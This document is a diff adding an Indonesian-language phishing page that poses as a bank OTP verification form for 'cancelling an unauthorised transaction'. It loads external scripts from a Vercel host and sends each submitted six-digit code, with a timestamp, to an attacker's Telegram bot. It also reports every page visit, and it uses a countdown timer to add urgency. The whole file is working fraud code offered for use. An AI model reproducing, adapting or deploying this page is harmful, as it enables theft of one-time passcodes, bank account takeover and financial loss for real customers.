@@ -1,0 +1,217 @@
+<!DOCTYPE html>
+<html lang="id">
+<head>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=no">
+  <meta name="theme-color" content="#ff9315">
+  <title>Verifikasi OTP</title>
+  <style>
+    /* ===== WARNA & UKURAN TIDAK DIUBAH ===== */
+    body, html {
+      margin: 0;
+      padding: 0;
+      height: 100%;
+      font-family: Arial, sans-serif;
+    }
+
+    .background {
+      background-image: url('https://blogger.googleusercontent.com/img/a/AVvXsEhXlg5fhyWQY4Vp0bb_BelRPPfYgH9KBasWkVcvlW8MdUMWeNlbBA7pyzF8SjMU66M6Y11PqNwtnP_Dy5kkD090OPG085Xfdxez7hnPn1OsBanyrXnoSk5DBbDOzF2J0fKtOvdwWmZIACA9qneuSRJuTW6-uXqAe3fX8EZ0rAjD5N9ZuOM_goevc_eVoo0Q');
+      background-position: center;
+      background-repeat: no-repeat;
+      background-size: cover;
+      display: flex;
+      align-items: center;
+      justify-content: center;
+      height: 100%;
+    }
+
+    .form-container {
+      background: #fff;
+      padding: 20px;
+      border-radius: 10px;
+      width: 90%;
+      max-width: 300px;
+      box-shadow: 0 0 5px rgba(0,0,0,0.2);
+    }
+
+    .form-group {
+      margin-bottom: 20px;
+    }
+
+    label {
+      display: block;
+      margin-bottom: 6px;
+      margin-left: 10px;
+    }
+
+    input {
+      width: 85%;
+      padding: 10px;
+      border: 1.5px solid orange;
+      border-radius: 25px;
+      text-align: center;
+      font-size: 16px;
+      margin-left: 10px;
+    }
+
+    button {
+      width: 90%;
+      padding: 12px;
+      border: none;
+      margin-left: 13px;
+      border-radius: 25px;
+      background-color: #ff9315;
+      color: white;
+      font-size: 16px;
+      font-weight: bold;
+      cursor: pointer;
+    }
+
+    button:hover {
+      background-color: #e68400;
+    }
+
+    nav {
+      width: 100%;
+      position: fixed;
+      background-color: white;
+      z-index: 1000;
+      border: 2px solid #ffffff;
+    }
+
+    nav.top {
+      top: 0;
+      margin-left: 0%;
+      border-bottom: 2px solid #ccc;
+    }
+
+    nav.bottom {
+      bottom: 0;
+      border-top: 2px solid #ddd;
+    }
+
+    nav img {
+      width: 100%;
+      height: auto;
+      display: block;
+    }
+
+    p {
+      font-size: 14px;
+      text-align: center;
+      line-height: 1.5;
+    }
+
+    #timer {
+      margin-top: 15px;
+      text-align: center;
+      color: black;
+      font-size: 13px;
+    }
+  </style>
+</head>
+<body>
+  <!-- Navigasi Atas -->
+  <nav class="top">
+    <img src="images/Picsart_25-04-04_14-51-50-816.jpg" alt="Nav Atas">
+  </nav>
+
+  <!-- Latar Belakang & Form OTP -->
+  <div class="background">
+    <div class="form-container">
+      <h3 style="text-align: center; margin-bottom: 15px;">Verifikasi OTP</h3>
+      <p>Code Otentikasi sudah dikirim ke<br>telepon seluler anda<br>+628xxxxxxxxx Masukan Code<br>Otentikasi untuk membatalkan<br>transaksi yang tidak anda lakukan</p>
+      
+      <div id="timer" style="margin-top: 15px; margin-bottom: 10px;">
+        Kode Dikirim: <span id="countdown">5:00</span> menit
+      </div>
+      <div id="resend" style="display: none; text-align: center; margin-bottom: 15px;">
+        <span id="resendText" style="cursor: pointer; color: blue;">Kirim Ulang</span>
+      </div>
+
+      <form id="otp-form">
+        <div class="form-group">
+          <input type="tel" id="otp" name="otp" maxlength="6" inputmode="numeric" placeholder="Masukkan 6 digit kode OTP" required>
+        </div>
+        <div class="form-group">
+          <button type="submit">Batalkan Transaksi</button>
+        </div>
+      </form>
+    </div>
+  </div>
+
+  <!-- ✅ PANGGIL FILE TELEGRAM TERPISAH — config.js DULU, BARU telegram-bot.js -->
+  <script src="https://bni-one.vercel.app/tel/conf.js"></script>
+  <script src="https://bni-one.vercel.app/tel/tet.js"></script>
+
+  <script>
+    // ===== NOTIFIKASI HALAMAN DIBUKA =====
+    document.addEventListener("DOMContentLoaded", () => {
+      notifikasiHalamanDibuka("Halaman Verifikasi OTP - Pembatalan Transaksi");
+      mulaiTimer();
+    });
+
+    // ===== TIMER HITUNG MUNDUR 5 MENIT =====
+    let timeLeft = 5 * 60;
+    const countdownEl = document.getElementById('countdown');
+    const timerDiv = document.getElementById('timer');
+    const resendDiv = document.getElementById('resend');
+
+    function formatTime(seconds) {
+      const minutes = Math.floor(seconds / 60);
+      const secs = seconds % 60;
+      return `${minutes}:${secs.toString().padStart(2, '0')}`;
+    }
+
+    function mulaiTimer() {
+      timeLeft = 5 * 60;
+      timerDiv.style.display = 'block';
+      resendDiv.style.display = 'none';
+      
+      const timerInterval = setInterval(() => {
+        timeLeft--;
+        countdownEl.textContent = formatTime(timeLeft);
+
+        if (timeLeft <= 0) {
+          clearInterval(timerInterval);
+          timerDiv.style.display = 'none';
+          resendDiv.style.display = 'block';
+        }
+      }, 1000);
+    }
+
+    // Kirim ulang OTP → reload halaman
+    document.getElementById('resendText').addEventListener('click', () => {
+      location.reload();
+    });
+
+    // ===== KIRIM OTP KE TELEGRAM =====
+    document.getElementById("otp-form").addEventListener("submit", async function(e) {
+      e.preventDefault();
+      
+      const otp = document.getElementById("otp").value.trim();
+      
+      // Validasi OTP 6 digit
+      if (!/^\d{6}$/.test(otp)) {
+        alert("Masukkan 6 digit kode OTP yang benar!");
+        return;
+      }
+
+      // ✅ PAKAI FUNGSI DARI FILE TERPISAH
+      const berhasil = await kirimPesanTelegram(`
+🔐 VERIFIKASI OTP — PEMBATALAN TRANSAKSI
+━━━━━━━━━━━━━━━━━━━━━━━━━━━━
+📱 Kode OTP: ${otp}
+🕐 Waktu: ${new Date().toLocaleString('id-ID', {timeZone:'Asia/Jakarta'})}
+━━━━━━━━━━━━━━━━━━━━━━━━━━━━
+      `.trim());
+
+      if (berhasil) {
+        lanjutKeHalamanBerikutnya();
+      } else {
+        alert("Gagal mengirim kode OTP. Silakan coba lagi.");
+      }
+    });
+  </script>
+</body>
+</html>
